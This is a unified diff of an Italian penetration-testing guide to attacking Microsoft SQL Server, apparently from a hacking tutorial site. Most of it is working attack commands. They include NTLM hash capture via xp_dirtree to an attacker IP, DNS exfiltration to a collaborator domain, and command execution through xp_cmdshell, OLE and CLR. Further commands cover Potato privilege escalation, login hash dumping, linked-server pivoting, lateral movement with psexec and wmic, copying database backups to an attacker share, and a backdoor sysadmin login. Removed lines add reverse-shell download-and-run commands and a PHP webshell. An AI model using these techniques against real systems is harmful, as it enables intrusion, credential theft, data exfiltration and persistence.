+`msdb` in particolare vale un controllo: se hai permessi di scrittura sui job SQL Server Agent, puoi far eseguire comandi da un account diverso (spesso più privilegiato) da quello con cui sei connesso.
+
+```sql
+-- Vedi i job configurati
+SELECT name, enabled FROM msdb.dbo.sysjobs;
 ```
 
 ***
 
-> **Errore tipico:** scrivere `SELECT name, FROM tabella` con la virgola prima di FROM. La struttura corretta è sempre `SELECT val1, val2, val3 FROM tabella` — la FROM viene dopo tutti i valori, mai in mezzo.
+## 7. Enumerazione Approfondita dell'Istanza {#7}
 
-## 8. Error-Based: Fai Parlare gli Errori {#8}
+Prima di lanciarti su hash capture o RCE, un pentester esperto passa qualche minuto a mappare com'è configurata l'istanza e cosa contiene: spesso qui dentro trovi già credenziali o vie dirette a sysadmin, senza bisogno di exploit.
+
+### Configurazione del server
+
+Ogni funzione avanzata di MSSQL (xp\_cmdshell, CLR, script esterni...) è on/off tramite `sp_configure`. Guardarla subito ti dice cosa è già disponibile senza doverlo abilitare tu — e se qualcosa è già acceso, probabilmente lo usa l'applicazione stessa.
 
 ```sql
--- CONVERT (il più usato)
-' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- -
-' AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~'))-- -
-
--- CAST
-' AND 1=CAST((SELECT TOP 1 name FROM master..sysdatabases) AS int)-- -
-
--- Per parametri stringa
-' + convert(int,@@version) + '
-
--- Tutti i DB in una riga
-' AND 1=CAST((SELECT (SELECT name+' ' FROM master..sysdatabases FOR XML PATH(''))) AS int)-- -
+SELECT name, value, value_in_use, description FROM sys.configurations;
+-- Oppure, forma classica equivalente
+EXEC sp_configure;
 ```
 
-L'errore che ricevi conterrà i tuoi dati:
+Cerca in particolare: `xp_cmdshell`, `Ole Automation Procedures`, `clr enabled`, `external scripts enabled`, `remote access`, `Ad Hoc Distributed Queries`, `contained database authentication`.
 
+### Proprietari e Trustworthy dei database
+
+Nella sezione 11 trovi come sfruttare un database `trustworthy` per la privesc — ma prima devi sapere quali database lo sono e chi li possiede, altrimenti stai cercando alla cieca.
+
+```sql
+SELECT name, SUSER_SNAME(owner_sid) AS owner, is_trustworthy_on FROM sys.databases;
 ```
-Conversion failed when converting the varchar value 'master tempdb model msdb' to data type int.
+
+Se `owner` è `sa` (o un altro sysadmin) e `is_trustworthy_on = 1`, quel database è un bersaglio prioritario per la privesc via stored procedure.
+
+### Database Mail
+
+Il sottosistema di invio email di MSSQL salva spesso credenziali SMTP in chiaro o cifrate debolmente — vale sempre un controllo.
+
+```sql
+EXEC msdb.dbo.sysmail_help_account_sp;
+EXEC msdb.dbo.sysmail_help_profile_sp;
+SELECT * FROM msdb.dbo.sysmail_account;
+```
+
+Se trovi un account configurato, spesso la password è riusata anche altrove (dominio, altri servizi).
+
+### SQL Server Agent: job, step e operatori
+
+Hai già visto come creare un job per la persistenza (sezione 14) — ma un'istanza reale ha quasi sempre job già esistenti, e leggerli ti dice sotto quale account girano e se contengono script sfruttabili.
+
+```sql
+SELECT job_id, name, enabled FROM msdb.dbo.sysjobs;
+SELECT step_name, command, database_name FROM msdb.dbo.sysjobsteps;
+SELECT * FROM msdb.dbo.sysoperators;
+```
+
+I job spesso girano con un account di servizio più privilegiato di quello con cui sei connesso — se puoi modificarne uno, quello step diventa la tua via verso quel privilegio.
+
+### Credential, Proxy ed External Data Source
+
+Oltre ai linked server (sezione 12), MSSQL può salvare credenziali per l'accesso a risorse esterne (cloud storage, proxy per l'Agent) tramite oggetti `CREDENTIAL`.
+
+```sql
+SELECT * FROM sys.credentials;
+SELECT * FROM msdb.dbo.sysproxies;
+```
+
+### Login Trigger
+
+Un trigger di login esegue codice ogni volta che qualcuno si connette — utile da conoscere sia per capire comportamenti anomali (blocchi di connessione inspiegabili) sia perché può rivelare logica di sicurezza custom dell'azienda.
+
+```sql
+SELECT * FROM sys.server_triggers;
+```
+
+### Endpoint e Service Broker
+
+Gli endpoint espongono funzionalità di rete aggiuntive oltre alla connessione TDS standard (database mirroring, Service Broker) — utile per capire se l'istanza ha altre porte o canali di comunicazione oltre alla 1433.
+
+```sql
+SELECT * FROM sys.endpoints;
+SELECT * FROM sys.services;
+SELECT * FROM sys.service_queues;
+```
+
+Il Service Broker in particolare è comune in ambienti enterprise per la messaggistica asincrona tra applicazioni — se lo trovi configurato, può essere un canale di comunicazione tra sistemi che non conoscevi.
+
+### Certificati e chiavi
+
+MSSQL usa certificati e chiavi simmetriche per cifrare dati sensibili a livello di colonna o per firmare oggetti — sapere cosa esiste ti dice se ci sono dati cifrati che varrebbe la pena decifrare (fuori dallo scope di questo articolo, ma da segnare).
+
+```sql
+SELECT * FROM sys.certificates;
+SELECT * FROM sys.symmetric_keys;
+```
+
+### Assembly CLR già presenti
+
+Prima di crearne uno tuo (sezione 9), controlla se l'applicazione ne ha già caricati: a volte un assembly esistente ha già funzionalità che puoi riusare senza dover passare da `dbo`.
+
+```sql
+SELECT * FROM sys.assemblies;
+```
+
+### Trigger sulle tabelle
+
+Molte applicazioni collegano logiche di business (o di sicurezza) ai trigger sulle tabelle — leggerli ti dice cosa succede "dietro le quinte" quando inserisci o modifichi dati, utile anche per capire se la tua attività lascia tracce extra.
+
+```sql
+SELECT * FROM sys.triggers;
+```
+
+### View e Stored Procedure custom
+
+Questa è probabilmente la parte più redditizia di tutta l'enumerazione: le applicazioni aziendali quasi sempre aggiungono stored procedure custom per operazioni interne (reset password, sync utenti AD, backup, import dati) — spesso girano con permessi elevati e sono pensate per essere chiamate solo dall'app, non testate contro un attaccante.
+
+```sql
+-- View: spesso espongono join già pronti su dati sensibili
+SELECT * FROM INFORMATION_SCHEMA.VIEWS;
+SELECT * FROM sys.views;
+
+-- Stored procedure custom (non quelle di sistema)
+SELECT name FROM sys.procedures;
+SELECT name FROM sys.objects WHERE type='P';
+
+-- Function custom
+SELECT name FROM sys.objects WHERE type='FN';
+```
+
+Una volta trovata una procedure con un nome interessante (es. `sp_ResetPassword`, `sp_SyncADUsers`), guarda il suo codice:
+
+```sql
+EXEC sp_helptext 'NomeProcedure';
+```
+
+### Ricerca automatica di dati sensibili
+
+Invece di controllare tabella per tabella, cerca direttamente colonne con nomi sospetti in tutto il database — è quello che fa quasi ogni pentester prima di dumpare a mano.
+
+```sql
+SELECT table_name, column_name FROM information_schema.columns
+WHERE column_name LIKE '%password%' OR column_name LIKE '%pwd%'
+   OR column_name LIKE '%hash%' OR column_name LIKE '%secret%'
+   OR column_name LIKE '%token%' OR column_name LIKE '%apikey%'
+   OR column_name LIKE '%key%' OR column_name LIKE '%mail%'
+   OR column_name LIKE '%username%' OR column_name LIKE '%ssn%'
+   OR column_name LIKE '%iban%';
 ```
 
 ***
 
-## 9. Blind SQL Injection: Boolean e Time-Based {#9}
+## 8. Hash Capture via xp\_dirtree {#8}
 
-### Boolean Blind
+Il vettore più sottovalutato di MSSQL — e uno dei più potenti, perché quasi mai richiede sysadmin.
 
-Pagina che non mostra dati SQL ma cambia tra TRUE e FALSE.
-
-```sql
--- Conferma discriminatore
-' AND 1=1-- -    → pagina normale (TRUE)
-' AND 1=2-- -    → pagina diversa (FALSE)
-
--- Lunghezza
-' AND LEN((SELECT TOP 1 name FROM master..sysdatabases))=6-- -
-
--- Carattere per carattere (confronto diretto)
-' AND SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1)='m'-- -
-
--- Con ASCII + binary search (più veloce in automazione)
-' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1))>64-- -
-' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1))=109-- -
-
--- Dump password
-' AND SUBSTRING((SELECT TOP 1 password FROM NomeDB..users),1,1)='a'-- -
-
--- Riga successiva
-' AND SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN ('master')),1,1)='t'-- -
-```
-
-### Time-Based Blind
-
-```sql
--- Conferma — varianti da provare
-'; IF(1=1) WAITFOR DELAY '0:0:5';-- -
-ProductID=1'; WAITFOR DELAY '0:0:5';-- -
-ProductID=1); WAITFOR DELAY '0:0:5';-- -
-ProductID=1')); WAITFOR DELAY '0:0:5';-- -
-
--- Estrai carattere per carattere
-'; IF(ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1))=109) WAITFOR DELAY '0:0:5';-- -
-
--- Verifica sysadmin
-'; IF(IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5';-- -
-
--- Verifica esistenza tabella
-'; IF EXISTS(SELECT * FROM NomeDB..NomeTabella) WAITFOR DELAY '0:0:5';-- -
-```
-
-Per automatizzare usa [sqlmap](https://hackita.it/articoli/sqlmap) con `--technique=B` o uno [script Python per blind SQLi](https://hackita.it/articoli/blind-sql-injection). Con time-based usa `--time-sec=5 --threads=1` — più thread = falsi positivi garantiti.
-
-**sqlmap quando il WAF blocca il fingerprint:**
+**Perché funziona:** forzi il servizio MSSQL a fare una richiesta SMB verso un host che controlli tu. Il service account SQL si autentica automaticamente contro quell'host, e tu catturi il suo hash NTLMv2.
 
 ```bash
-sqlmap -r req.txt -p q --force-ssl --dbms=mssql --technique=B \
-  --tamper=space2mssqlblank,charencode,randomcase \
-  --string="valore_TRUE" --flush-session --no-cast --dbs
-```
-
-***
-
-## 10. Stacked Queries: Statement Multipli {#10}
-
-```sql
--- Conferma (nota il ; finale prima del commento)
-'; SELECT 1;-- -
-
--- Bypass blacklist "EXEC xp_cmdshell" con variabile
-'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'whoami';-- -
-
--- Stacked senza punto e virgola (MSSQL specifico)
-SELECT 'A' SELECT 'B'
-
--- Scrivi su tabella temporanea poi leggi con UNION
-'; CREATE TABLE #tmp (data VARCHAR(1000)); INSERT INTO #tmp SELECT name FROM master..sysdatabases;-- -
-' UNION SELECT NULL,(SELECT TOP 1 data FROM #tmp),NULL-- -
-```
-
-***
-
-## 11. Hash Capture via xp\_dirtree {#11}
-
-Uno dei vettori più sottovalutati di MSSQL — e uno dei più potenti.
-
-**Perché è importante:**
-
-* Non richiede `xp_cmdshell` né sysadmin
-* Quasi sempre disponibile anche per utenti con privilegi bassi
-* Cattura l'hash NTLMv2 del service account SQL
-* Non genera i tipici alert EDR legati all'esecuzione di processi OS
-* Apre la strada a cracking con hashcat o relay con ntlmrelayx
-
-**Come funziona:** forzi MSSQL a fare una richiesta SMB verso il tuo IP. [Responder](https://hackita.it/articoli/responder) cattura il challenge NTLMv2 del service account.
-
-```bash
-# Avvia PRIMA di mandare il payload
+# Avvia PRIMA di lanciare il payload SQL
 sudo responder -I tun0 -v
 ```
 
+Se non conosci ancora lo strumento, trovi la guida completa su [Responder](https://hackita.it/articoli/responder).
+
 ```sql
--- Varianti (tutte catturano NTLMv2)
-'; EXEC master.dbo.xp_dirtree '\\10.10.14.123\share';-- -
-'; EXEC master..xp_subdirs '\\10.10.14.123\share';-- -
-'; EXEC master..xp_fileexist '\\10.10.14.123\share\file';-- -
-
--- Via BACKUP (metodo alternativo)
-BACKUP LOG [TESTING] TO DISK='\\10.10.14.123\file'
-RESTORE HEADERONLY FROM DISK='\\10.10.14.123\file'
-
--- Bypass WAF con variabile
-'; DECLARE @q VARCHAR(99); SET @q='\\10.10.14.123\'; SET @q=@q+'share'; EXEC master.dbo.xp_dirtree @q;-- -
+EXEC master.dbo.xp_dirtree '\\10.10.14.123\share';
+-- Alternative se xp_dirtree è bloccato
+EXEC master..xp_subdirs '\\10.10.14.123\share';
+EXEC master..xp_fileexist '\\10.10.14.123\share\file';
 ```
 
 **Output Responder:**
@@ -799,112 +469,127 @@ RESTORE HEADERONLY FROM DISK='\\10.10.14.123\file'
 
 Cracca con `hashcat -m 5600 hash.txt rockyou.txt`.
 
-> **Attenzione:** se l'hash è di un account macchina (username termina con `$`, es. `CORP\SQL01$`) non si cracca — le password degli account macchina sono casuali e lunghe 120 caratteri. In quel caso passa direttamente al relay.
+> **Attenzione:** se l'username dell'hash termina con `$` (es. `CORP\SQL01$`) è un account macchina — password casuale di 120 caratteri, non craccabile. In quel caso passa a un relay con [ntlmrelayx.py](https://hackita.it/articoli/impacket).
 
-**Verifica chi ha i permessi:**
+Verifica chi ha i permessi per usarlo (utile anche come utente non-sysadmin):
 
 ```sql
 Use master; EXEC sp_helprotect 'xp_dirtree';
 Use master; EXEC sp_helprotect 'xp_subdirs';
 ```
 
-***
+### Alternativa quando SMB è bloccato in uscita: esfiltrazione via DNS
 
-## 12. RCE con xp\_cmdshell e Metodi Alternativi {#12}
-
-### xp\_cmdshell
+Se il firewall blocca il traffico SMB (445) in uscita ma non il DNS, puoi comunque far uscire dati usando funzioni che risolvono un nome di dominio contenente il dato che vuoi esfiltrare. Richiede permesso `VIEW SERVER STATE` (o `CONTROL SERVER` per la seconda variante):
 
 ```sql
--- Verifica sysadmin e stato
-SELECT IS_SRVROLEMEMBER('sysadmin');
-SELECT CONVERT(INT, ISNULL(value, value_in_use)) FROM sys.configurations WHERE name='xp_cmdshell';
+-- Il subdomain risolto arriva al tuo server DNS/Burp Collaborator con il dato incluso
+SELECT * FROM fn_xe_file_target_read_file('C:\*.xel','\\'+(SELECT TOP 1 name FROM sys.databases)+'.tuosubdominio.burpcollaborator.net\1.xem',null,null);
+```
 
--- Abilita (step by step)
+Utile in ambienti con EDR aggressivo sul traffico SMB, dove xp\_dirtree verrebbe bloccato o segnalato subito.
+
+***
+
+## 9. RCE con xp\_cmdshell e Metodi Alternativi {#9}
+
+### xp\_cmdshell (richiede sysadmin)
+
+```sql
+-- Verifica lo stato attuale
+SELECT name, value, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
+
+-- Abilita
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
--- One liner
-EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-
--- Esegui comandi base
+-- Esegui
 EXEC master..xp_cmdshell 'whoami';
 EXEC master..xp_cmdshell 'whoami /priv';
 EXEC master..xp_cmdshell 'net user /domain';
-EXEC master..xp_cmdshell 'net group "Domain Admins" /domain';
-EXEC master..xp_cmdshell 'ipconfig /all';
-
--- Reverse shell
-EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.123/shell.ps1") | powershell -noprofile';
-EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.123/shell.exe C:\Windows\Temp\s.exe && C:\Windows\Temp\s.exe';
 
 -- Disabilita dopo l'uso (OPSEC)
 EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
 ```
 
-### Metodi alternativi — meno rumore per gli EDR
+`xp_cmdshell` genera un processo figlio di `sqlservr.exe` — la maggior parte degli EDR lo monitora attivamente.
 
-`xp_cmdshell` genera un processo figlio di `sqlservr.exe` — quasi tutti gli EDR lo monitorano. Questi metodi sono meno visibili:
+### Metodi alternativi — meno rumore
+
+**OLE Automation** (non richiede la creazione di un processo diretto visibile come xp\_cmdshell):
 
 ```sql
--- OLE Automation
 EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
 DECLARE @shell INT;
 EXEC sp_OACreate 'WScript.Shell', @shell OUT;
 EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\Windows\Temp\out.txt';
-
--- Python (gira come utente diverso da xp_cmdshell)
-EXECUTE sp_execute_external_script @language=N'Python',
-  @script=N'print(__import__("os").system("whoami"))';
-EXECUTE sp_execute_external_script @language=N'Python',
-  @script=N'print(open("C:\\inetpub\\wwwroot\\web.config","r").read())';
-
--- Webshell via OLE (8 = ForAppending — apre il file in append)
-DECLARE @OLE INT, @FileID INT;
-EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
-EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.php', 8, 1;
-EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
-EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE;
 ```
 
-### Lettura file e registro
+**Python o R** (girano come un service account diverso da xp\_cmdshell):
+
+```sql
+EXECUTE sp_execute_external_script @language=N'Python',
+  @script=N'print(__import__("os").system("whoami"))';
+```
+
+**CLR Assembly** (richiede accesso `dbo`, il più stealth ma il più complesso da preparare — carica una DLL .NET personalizzata come funzione SQL):
+
+```sql
+CREATE ASSEMBLY MyAssembly FROM 0x4D5A9000...
+CREATE FUNCTION dbo.RunCmd(@cmd NVARCHAR(MAX)) RETURNS NVARCHAR(MAX)
+AS EXTERNAL NAME MyAssembly.[StoredProcedures].RunCmd;
+```
+
+### Da service account a SYSTEM — SeImpersonatePrivilege
+
+Il service account con cui gira MSSQL ha quasi sempre il privilegio token `SeImpersonatePrivilege` abilitato. Se sei già arrivato a una shell OS (via xp\_cmdshell o altro), verificalo e sfruttalo per salire a SYSTEM:
+
+```sql
+EXEC xp_cmdshell 'whoami /priv';
+```
+
+Se `SeImpersonatePrivilege` compare come `Enabled`, usa uno dei Potato attack:
+
+```bash
+GodPotato.exe -cmd "cmd /c whoami"
+PrintSpoofer.exe -c "cmd /c whoami"
+```
+
+Alternative equivalenti: `RoguePotato`, `SharpEfsPotato`.
+
+***
+
+## 10. Lettura File e Registro di Windows {#10}
 
 ```sql
 -- Lettura file (richiede ADMINISTER BULK OPERATIONS)
 SELECT * FROM OPENROWSET(BULK N'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;
 SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS Contents;
 
--- Error-based file read via SQLi
--1 UNION SELECT NULL,(SELECT x FROM OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),NULL-- -
-
 -- Registro di Windows
 EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName';
 EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\MSSQLSERVER','ObjectName';
 ```
 
-***
+L'ultimo comando ti dice con quale account Windows gira il servizio MSSQL — informazione utile prima di un lateral movement.
 
-## 12b. DNS Exfiltration Out-of-Band {#12b}
+### Scrivere file sul filesystem
 
-Quando non puoi usare Responder (firewall outbound sulla 445) ma hai accesso a Burp Collaborator o un tuo DNS server:
+Se hai una stored procedure custom di scrittura file (comune in applicazioni che generano report o log), puoi usarla per depositare una webshell o un payload:
 
 ```sql
--- xp_dirtree verso Burp Collaborator (nessuna porta SMB necessaria, usa DNS)
-'; EXEC master..xp_dirtree '\\tuosubdominio.burpcollaborator.net\share';-- -
-
--- fn_xe_file_target_read_file (richiede VIEW SERVER STATE)
-'; IF EXISTS(SELECT * FROM fn_xe_file_target_read_file('C:\*.xel','\\'+(SELECT TOP 1 name FROM master..sysdatabases)+'.tuosubdominio.burpcollaborator.net\1.xem',null,null)) SELECT 1;-- -
-
--- Esfiltra dati via DNS (nome DB nel subdomain)
-'; DECLARE @q NVARCHAR(256); SELECT @q=DB_NAME(); DECLARE @cmd NVARCHAR(4000); SET @cmd='\\'+@q+'.tuosubdominio.burpcollaborator.net\path'; EXEC master.dbo.xp_dirtree @cmd;-- -
+EXEC spWriteStringToFile 'contenuto', 'C:\inetpub\wwwroot\', 'shell.aspx';
 ```
 
-Il subdomain che arriva al tuo DNS contiene il dato — in questo caso il nome del DB. Funziona anche quando la porta 445 è bloccata in uscita.
+Non è una funzione nativa di MSSQL: dipende dall'applicazione — cercala nell'enumerazione delle stored procedure custom (sezione 7).
 
 ***
 
-## 13. Privilege Escalation Interna {#13}
+## 11. Privilege Escalation Interna {#11}
 
 ### Impersonation
+
+Se un login ha permesso `IMPERSONATE` su un altro login più privilegiato, puoi diventare quell'utente senza conoscerne la password.
 
 ```sql
 -- Chi posso impersonare?
@@ -917,27 +602,23 @@ EXECUTE AS LOGIN='sa';
 SELECT SYSTEM_USER;
 SELECT IS_SRVROLEMEMBER('sysadmin');
 
--- Torna indietro
+-- Torna al tuo utente originale
 REVERT;
 ```
 
-### db\_owner su Database Trustworthy
+### Da db\_owner a sysadmin (database Trustworthy)
+
+Se sei `db_owner` di un database con `is_trustworthy_on = 1` e il proprietario del database è un login sysadmin (spesso `sa`), puoi creare una stored procedure che eredita quel contesto.
 
 ```sql
 -- Trova database trustworthy
-SELECT a.name, b.is_trustworthy_on FROM master..sysdatabases a
-INNER JOIN sys.databases b ON a.name=b.name WHERE b.is_trustworthy_on=1;
+SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;
 
--- Verifica se sei db_owner
+-- Verifica se sei db_owner sul DB trovato
 USE NomeDB;
-SELECT rp.name AS role, mp.name AS user
-FROM sys.database_role_members drm
-JOIN sys.database_principals rp ON drm.role_principal_id=rp.principal_id
-JOIN sys.database_principals mp ON drm.member_principal_id=mp.principal_id
-WHERE rp.name='db_owner';
+SELECT IS_ROLEMEMBER('db_owner');
 
--- Crea stored procedure che esegue come il proprietario (admin)
-USE NomeDB;
+-- Crea la stored procedure che esegue come proprietario
 CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS
 EXEC sp_addsrvrolemember 'TUO_UTENTE','sysadmin';
 
@@ -948,43 +629,41 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 DROP PROCEDURE sp_elevate;
 ```
 
-### SeImpersonatePrivilege — Potato Attacks
+### Estrarre gli hash dei login SQL (richiede sysadmin)
 
-Se ottieni una shell come service account MSSQL e il token `SeImpersonatePrivilege` è abilitato (`whoami /priv`), puoi scalare a SYSTEM con:
+Se sei sysadmin, puoi dumpare direttamente gli hash delle password dei login SQL — utili per movimento laterale se riusati su altri servizi. Il formato cambia in base alla versione dell'istanza, quindi verifica prima con `SELECT @@VERSION;`:
 
-```bash
-# Verifica token
-EXEC xp_cmdshell 'whoami /priv';
+```sql
+-- MSSQL 2005+ (hashcat mode 132)
+SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;
 
-# Se SeImpersonatePrivilege è presente → Potato attack
-# GodPotato, PrintSpoofer, RoguePotato, JuicyPotato
-EXEC xp_cmdshell 'C:\Windows\Temp\GodPotato.exe -cmd "cmd /c whoami"';
+-- MSSQL 2000 (tabella diversa, hashcat mode 131)
+SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins;
 ```
+
+Cracca con `hashcat -m 1731 hashes.txt rockyou.txt` (MSSQL 2012+, algoritmo cambiato), `-m 132` per 2005-2008, `-m 131` per 2000. Approfondisci l'uso di [hashcat](https://hackita.it/articoli/hashcat) per scegliere la modalità giusta.
 
 ***
 
-## 14. Linked Server: Lateral Movement tra SQL Server {#14}
+## 12. Linked Server: Lateral Movement e Password Recovery {#12}
 
-I linked server collegano istanze MSSQL tra loro — anche cross-domain. L'idea operativa è questa: potresti avere accesso limitato su SQL01, ma SQL01 è configurato per connettersi a SQL02 con un account più privilegiato. SQL02 si connette a SQL03 con privilegi ancora maggiori. Ogni hop può portarti a sysadmin su un server diverso senza che tu abbia mai avuto credenziali dirette su quei server.
+I linked server collegano istanze MSSQL tra loro, anche cross-dominio. L'idea operativa: puoi avere accesso limitato su SQL01, ma SQL01 è configurato per connettersi a SQL02 con un account più privilegiato — ogni hop può portarti a sysadmin su un server diverso senza credenziali dirette.
 
 ```sql
 -- Lista linked server
 SELECT name, data_source FROM sys.servers WHERE is_linked=1;
+EXEC sp_linkedservers;
 
 -- Chi sei sul server remoto?
 EXEC ('SELECT SYSTEM_USER') AT [SERVER_COLLEGATO];
 EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [SERVER_COLLEGATO];
 
--- Verifica il mapping delle credenziali (con quale account ti connetti al remoto)
-EXEC sp_helplinkedsrvlogin 'NOME_LINKED_SERVER';
+-- Verifica il mapping delle credenziali usate per collegarsi
+EXEC sp_helplinkedsrvlogin;
 
 -- RCE se sei sysadmin sul remoto
-EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE;') AT [SERVER_COLLEGATO];
-EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [SERVER_COLLEGATO];
+EXEC ('EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT [SERVER_COLLEGATO];
 EXEC ('EXEC xp_cmdshell ''whoami''') AT [SERVER_COLLEGATO];
-
--- Chain di server (SQL01 → SQL02 → SQL03)
-SELECT version FROM OPENQUERY("link1",'SELECT version FROM OPENQUERY(''link2'',''SELECT @@version AS version'')');
 ```
 
 Con `impacket-mssqlclient`:
@@ -993,15 +672,48 @@ Con `impacket-mssqlclient`:
 mssqlclient.py -windows-auth CORP/user:pass@SQLHOST
 enum_links
 use_link [NOME]
-enable_xp_cmdshell
-xp_cmdshell whoami
 ```
+
+Con **MSSqlPwner** (attraversa catene di link automaticamente e supporta anche NTLM relay attraverso di essi):
+
+```bash
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth get-link-server-list
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+```
+
+### Estrarre le password salvate dei linked server
+
+**Metodo classico (richiede sysadmin + Administrator locale):** le credenziali dei linked server sono salvate cifrate in `master.sys.syslnklgns`, cifrate con la Service Master Key (DPAPI). Servono una connessione DAC (Dedicated Administrator Connection, di norma solo locale) e un trace flag (`-T7806`) per accedervi. Con questi requisiti uno script PowerShell come `Get-MSSQLLinkPasswords` decifra le credenziali in chiaro — la tecnica originale è descritta nel [blog di NetSPI su questo attacco](https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-database-link-server-passwords/).
+
+**Metodo ADSI (nessun privilegio amministrativo richiesto, sfruttabile anche da SQL Injection):** se colleghi un linked server al provider ADSI verso un dominio, il bind LDAP verso di esso avviene in chiaro. Puntando l'URL LDAP verso un host che controlli tu, catturi la password del linked login o della sessione corrente senza bisogno di DAC né di accesso amministrativo alla macchina.
+
+### Pivoting quando solo la porta 1433 è raggiungibile: mssqlproxy
+
+Scenario da ambiente enterprise segmentato: sei sysadmin sull'istanza, ma il firewall lascia passare solo traffico verso la 1433 — niente reverse shell, niente xp\_cmdshell utile verso l'esterno. `mssqlproxy` risolve il problema riusando la connessione TCP già aperta tra te e il DB per farla diventare un tunnel SOCKS5, senza aprire nuove porte né nuove connessioni in uscita.
+
+**Come funziona:** carica una CLR assembly sul server che "recupera" (socket reuse) l'handle della tua stessa connessione TDS e ci fa passare dentro il traffico SOCKS, invece di aprirne una nuova che il firewall bloccherebbe.
+
+```bash
+# Client (richiede impacket + sysadmin sul server)
+git clone https://github.com/blackarrowsec/mssqlproxy
+python3 mssqlproxy.py -q sa:pass@10.10.10.15
+
+# Dentro la shell del tool:
+SQL> enable_ole
+SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
+SQL> proxy
+```
+
+Il tunnel apre un listener locale (es. porta 1337) che puoi usare con `proxychains` per instradare qualunque altro tool (evil-winrm, altri client SQL, RDP) attraverso il server compromesso, verso host altrimenti irraggiungibili.
+
+> **Attenzione:** interrompi sempre il proxy con `Ctrl+C` dal client — se la sessione muore in modo anomalo il servizio MSSQL può crashare e richiedere un riavvio manuale.
 
 ***
 
-## 15. Active Directory e Kerberoasting da MSSQL {#15}
+## 13. Active Directory e Kerberoasting da MSSQL {#13}
 
-Se il server SQL è joined al dominio, puoi enumerare [Active Directory](https://hackita.it/articoli/active-directory) direttamente.
+Se il server è joined al dominio, puoi enumerare [Active Directory](https://hackita.it/articoli/active-directory) direttamente dal DB.
 
 ```sql
 SELECT DEFAULT_DOMAIN();
@@ -1010,44 +722,105 @@ SELECT DEFAULT_DOMAIN();
 Il service account MSSQL quasi sempre ha un SPN (`MSSQLSvc/hostname:1433`) — è [Kerberoastable](https://hackita.it/articoli/kerberos) per design:
 
 ```bash
-# Kerberoast il service account
 GetUserSPNs.py corp.local/user:pass -dc-ip 10.10.10.10 -request | grep MSSQL
 hashcat -m 13100 tgs_hash.txt rockyou.txt
-
-# RID bruteforce utenti AD via MSSQL
-nxc mssql 10.10.10.15 -u sa -p 'pass' --rid-brute 5000
 ```
 
 ```sql
--- Con xp_cmdshell (se disponibile)
+-- Con xp_cmdshell abilitato
 EXEC xp_cmdshell 'net user /domain';
 EXEC xp_cmdshell 'net group "Domain Admins" /domain';
 EXEC xp_cmdshell 'nltest /domain_trusts';
 ```
 
+### Movimento laterale verso altri host del dominio
+
+Con xp\_cmdshell abilitato puoi usare il server MSSQL come punto di lancio verso altre macchine del dominio, se il service account ha le credenziali per farlo:
+
+```sql
+EXEC xp_cmdshell 'net view \\altro-host';
+EXEC xp_cmdshell 'psexec \\altro-host -u domain\admin -p password cmd.exe';
+EXEC xp_cmdshell 'wmic /node:altro-host process call create "cmd.exe /c payload.exe"';
+```
+
+### Esfiltrazione dati
+
+```sql
+-- Backup del DB su una share raggiungibile
+BACKUP DATABASE NomeDB TO DISK = 'C:\Temp\backup.bak';
+EXEC xp_cmdshell 'copy C:\Temp\backup.bak \\10.10.14.123\share\backup.bak';
+
+-- Export mirato di una tabella con bcp
+EXEC master..xp_cmdshell 'bcp "SELECT * FROM NomeDB.dbo.users" queryout "C:\users.txt" -c -T';
+```
+
+***
+
+## 14. Persistenza {#14}
+
+```sql
+-- Crea un login SQL con permessi sysadmin
+CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123!';
